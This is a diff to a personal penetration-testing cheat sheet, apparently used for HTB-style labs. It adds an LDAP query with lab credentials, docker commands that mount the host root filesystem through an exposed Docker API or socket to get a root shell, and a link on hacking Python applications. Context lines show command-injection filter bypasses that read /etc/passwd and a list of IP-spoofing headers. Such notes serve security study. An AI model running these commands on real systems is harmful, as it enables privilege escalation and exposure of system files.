@@ -53,6 +53,7 @@ https://d47zm3.me/resources/infosec/reverse-shells/
 
 [ldapsearch]
 ldapsearch -LLL -x -H ldap://<domain fqdn> -b ‘’ -s base ‘(objectclass=*)’
+ldapsearch -x -h 10.10.10.161 -D 'htb\svc-alfresco' -w 's3rvice' -b 'CN=Users,DC=HTB,DC=LOCAL'
 
 [ad-ldap-enum]
 ad-ldap-enum.py -l 10.10.10.10 -d domain.local
@@ -422,8 +423,13 @@ cat</etc/passwd
 {cat,/etc/passwd} OR {ls,-las,/var} with args
 X=$'cat\x20/etc/passwd'&&$X
 
-[docker restart if crash]
+[docker security]
+# restart if crash
 /usr/bin/docker container run --detach --privileged --restart=unless-stopped -p 8080:8080 --mount type=bind,source="/home/zac/notes",target=/home/zac/notes https
+# mount root directory to mnt using docker api
+docker -H tcp://10.10.25.34:2375 run -v /:/mnt --rm -it alpine:3.9 chroot /mnt sh
+# mount root directory to mnt using socker daemon
+./docker -H unix:///tmp/docker.sock run -v /:/mnt --rm -it alpine chroot /mnt sh
 
 [mounting shares]
 mount -f cifs '//172.16.1.31/Shares' mnt/
@@ -755,3 +761,6 @@ X-Client-IP : IP
 X-Remote-IP : IP
 X-Remote-Addr : IP
 X-Host : IP
+
+[Hacking Python]
+https://medium.com/swlh/hacking-python-applications-5d4cd541b3f1
